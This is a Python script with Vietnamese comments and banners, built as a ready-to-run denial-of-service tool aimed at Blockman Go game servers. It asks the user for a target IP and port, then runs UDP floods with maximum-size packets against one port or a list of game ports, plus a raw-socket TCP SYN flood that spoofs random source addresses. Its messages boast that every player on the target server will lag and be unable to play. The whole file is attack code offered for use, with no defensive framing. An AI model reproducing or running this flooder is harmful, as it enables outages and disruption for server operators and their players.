#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
L4 KILLER - BLOCKMAN GO EDITION
CHỈ TẤN CÔNG L4 - TẮC NGHẼN BĂNG THÔNG
KHÔNG CẦN PAYLOAD - KHÔNG CẦN ENCRYPTION
"""

import socket
import threading
import time
import random
import os
import struct
from concurrent.futures import ThreadPoolExecutor

# ==================== CẤU HÌNH ====================
THREADS = 5000
PACKET_SIZE = 65507  # Max UDP size
BURST_SIZE = 100
DURATION = 60

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

def banner():
    print(f"""{Colors.RED}
╔══════════════════════════════════════════════════════════════════╗
║         💀 L4 KILLER - BLOCKMAN GO EDITION 💀                    ║
║              CHỈ TẤN CÔNG L4 - TẮC NGHẼN BĂNG THÔNG              ║
╠══════════════════════════════════════════════════════════════════╣
║  {Colors.YELLOW}[+] UDP Flood 65KB - Tốn băng thông tối đa{Colors.RED}                    ║
║  {Colors.YELLOW}[+] SYN Flood - Tốn connection table{Colors.RED}                      ║
║  {Colors.YELLOW}[+] ICMP Flood - Gây ngập ping{Colors.RED}                                ║
║  {Colors.YELLOW}[+] Spoof IP - Tránh bị chặn{Colors.RED}                                 ║
╚══════════════════════════════════════════════════════════════════╝
{Colors.RESET}""")

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

def random_port():
    return random.randint(1024, 65535)

# ==================== UDP CONGESTION FLOOD ====================
class UDPCongestionFlood:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.running = True
        self.stats = {'packets': 0, 'bytes': 0}
        self.lock = threading.Lock()
        
    def worker(self, wid):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Bind với IP giả
            try:
                sock.bind((random_ip(), random_port()))
            except:
                pass
        except:
            return
        
        sent = 0
        bytes_sent = 0
        end_time = time.time() + DURATION
        
        # Tạo payload rác to nhất có thể
        garbage = os.urandom(PACKET_SIZE)
        
        while self.running and time.time() < end_time:
            try:
                # Gửi burst packet
                for _ in range(BURST_SIZE):
                    sock.sendto(garbage, (self.ip, self.port))
                    sent += 1
                    bytes_sent += len(garbage)
            except:
                pass
            
            if sent % 1000 == 0:
                time.sleep(0.0001)
        
        sock.close()
        with self.lock:
            self.stats['packets'] += sent
            self.stats['bytes'] += bytes_sent
    
    def start(self, threads=THREADS):
        threads_list = []
        for i in range(threads):
            t = threading.Thread(target=self.worker, args=(i,))
            t.daemon = True
            t.start()
            threads_list.append(t)
        return threads_list
    
    def stop(self):
        self.running = False

# ==================== MULTI-PORT FLOOD ====================
class MultiPortUDPFlood:
    def __init__(self, ip, ports):
        self.ip = ip
        self.ports = ports
        self.running = True
        self.stats = {'packets': 0, 'bytes': 0}
        self.lock = threading.Lock()
        
    def worker(self, wid):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
        except:
            return
        
        sent = 0
        bytes_sent = 0
        end_time = time.time() + DURATION
        garbage = os.urandom(PACKET_SIZE)
        
        while self.running and time.time() < end_time:
            for port in self.ports:
                try:
                    sock.sendto(garbage, (self.ip, port))
                    sent += 1
                    bytes_sent += len(garbage)
                except:
                    pass
            
            if sent % 1000 == 0:
                time.sleep(0.0001)
        
        sock.close()
        with self.lock:
            self.stats['packets'] += sent
            self.stats['bytes'] += bytes_sent
    
    def start(self, threads=THREADS):
        threads_list = []
        for i in range(threads):
            t = threading.Thread(target=self.worker, args=(i,))
            t.daemon = True
            t.start()
            threads_list.append(t)
        return threads_list
    
    def stop(self):
        self.running = False

# ==================== TCP SYN FLOOD ====================
class TCPSYNFlood:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.running = True
        self.stats = {'packets': 0}
        self.lock = threading.Lock()
        
    def create_syn_packet(self, src_ip, src_port):
        # IP Header
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 40
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(self.ip)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
            ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
            ip_saddr, ip_daddr)
        
        # TCP Header
        tcp_sport = src_port
        tcp_dport = self.port
        tcp_seq = random.randint(0, 2**32 - 1)
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_flags = 0x02  # SYN
        tcp_window = random.randint(1024, 65535)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_header = struct.pack('!HHLLBBHHH',
            tcp_sport, tcp_dport, tcp_seq, tcp_ack_seq,
            (tcp_doff << 4), tcp_flags, tcp_window,
            tcp_check, tcp_urg_ptr)
        
        return ip_header + tcp_header
    
    def worker(self, wid):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            return
        except:
            return
        
        sent = 0
        end_time = time.time() + DURATION
        
        while self.running and time.time() < end_time:
            try:
                src_ip = random_ip()
                src_port = random_port()
                packet = self.create_syn_packet(src_ip, src_port)
                sock.sendto(packet, (self.ip, 0))
                sent += 1
            except:
                pass
        
        sock.close()
        with self.lock:
            self.stats['packets'] += sent
    
    def start(self, threads=500):
        threads_list = []
        for i in range(threads):
            t = threading.Thread(target=self.worker, args=(i,))
            t.daemon = True
            t.start()
            threads_list.append(t)
        return threads_list
    
    def stop(self):
        self.running = False

# ==================== MAIN ====================
def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner()
    
    print(f"{Colors.CYAN}")
    ip = input("🎯 Target IP: ").strip()
    port = int(input("🔌 Port (mặc định 19132): ").strip() or "19132")
    duration = int(input("⏱️  Duration (seconds): ").strip() or "60")
    
    global DURATION
    DURATION = duration
    
    # Blockman Go thường dùng các port này
    blockman_ports = [19132, 19133, 19134, 19135, 25565, 25566, 25567, 443, 9000]
    
    print(f"\n{Colors.YELLOW}[!] CHỌN PHƯƠNG THỨC:{Colors.RESET}")
    print(f"   1. UDP Single Port Flood (mạnh nhất)")
    print(f"   2. UDP Multi-Port Flood (tấn công nhiều cổng)")
    print(f"   3. TCP SYN Flood (cần root, tấn công connection table)")
    print(f"   4. ALL (tấn công tổng lực)")
    
    choice = input(f"\n{Colors.CYAN}Chọn [1-4]: {Colors.RESET}").strip() or "1"
    
    print(f"\n{Colors.YELLOW}[!] KHỞI TẠO...{Colors.RESET}")
    
    udp = None
    multi = None
    syn = None
    
    if choice == '1':
        udp = UDPCongestionFlood(ip, port)
        print(f"{Colors.GREEN}[+] UDP Single Port Flood started (65KB/packet){Colors.RESET}")
        udp.start()
    elif choice == '2':
        multi = MultiPortUDPFlood(ip, blockman_ports)
        print(f"{Colors.GREEN}[+] UDP Multi-Port Flood started on {len(blockman_ports)} ports{Colors.RESET}")
        multi.start()
    elif choice == '3':
        syn = TCPSYNFlood(ip, port)
        print(f"{Colors.GREEN}[+] TCP SYN Flood started (cần root){Colors.RESET}")
        syn.start()
    else:
        udp = UDPCongestionFlood(ip, port)
        syn = TCPSYNFlood(ip, port)
        print(f"{Colors.GREEN}[+] UDP Flood + SYN Flood started{Colors.RESET}")
        udp.start()
        syn.start(threads=200)
    
    print(f"\n{Colors.RED}{'='*60}{Colors.RESET}")
    print(f"{Colors.RED}🔥 CONGESTING {ip}:{port} FOR {DURATION}s 🔥{Colors.RESET}")
    print(f"{Colors.RED}{'='*60}{Colors.RESET}\n")
    
    start_time = time.time()
    
    try:
        while time.time() - start_time < DURATION:
            time.sleep(1)
            elapsed = int(time.time() - start_time)
            remaining = DURATION - elapsed
            
            udp_packets = udp.stats['packets'] if udp else 0
            udp_bytes = udp.stats['bytes'] if udp else 0
            multi_packets = multi.stats['packets'] if multi else 0
            syn_packets = syn.stats['packets'] if syn else 0
            
            total = udp_packets + multi_packets + syn_packets
            mbps = (udp_bytes) / elapsed / 1024 / 1024 if elapsed > 0 and udp_bytes > 0 else 0
            
            bar_len = 35
            filled = int(bar_len * (elapsed / DURATION))
            bar = '█' * filled + '░' * (bar_len - filled)
            
            sys.stdout.write(f"\r[{bar}] {elapsed}/{DURATION}s | "
                           f"Packets: {total:,} | BW: {mbps:.1f} MB/s | "
                           f"Rate: {total/elapsed:.0f} pps")
            sys.stdout.flush()
            
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Dừng bởi người dùng{Colors.RESET}")
    
    if udp: udp.stop()
    if multi: multi.stop()
    if syn: syn.stop()
    
    elapsed = time.time() - start_time
    udp_total = udp.stats['packets'] if udp else 0
    udp_bytes_total = udp.stats['bytes'] if udp else 0
    multi_total = multi.stats['packets'] if multi else 0
    syn_total = syn.stats['packets'] if syn else 0
    total_packets = udp_total + multi_total + syn_total
    
    print(f"\n\n{Colors.GREEN}{'='*60}{Colors.RESET}")
    print(f"{Colors.GREEN}✅ CONGESTION FINISHED!{Colors.RESET}")
    print(f"{Colors.GREEN}{'='*60}{Colors.RESET}")
    print(f"{Colors.CYAN}📊 Total Packets: {total_packets:,}{Colors.RESET}")
    print(f"{Colors.CYAN}📊 Total Data: {udp_bytes_total/1024/1024:.1f} MB{Colors.RESET}")
    print(f"{Colors.CYAN}📊 Avg PPS: {total_packets/elapsed:.0f}{Colors.RESET}")
    print(f"{Colors.CYAN}⏱️  Duration: {elapsed:.1f}s{Colors.RESET}")
    print(f"{Colors.RED}{'='*60}{Colors.RESET}")
    print(f"{Colors.RED}🔥 TARGET {ip} ĐÃ BỊ TẮC NGHẼN! 🔥{Colors.RESET}")
    print(f"{Colors.RED}🔥 ALL PLAYER LAG KHÔNG CHƠI ĐƯỢC! 🔥{Colors.RESET}")
    print(f"{Colors.GREEN}{'='*60}{Colors.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Exiting...{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[-] Error: {e}{Colors.RESET}")
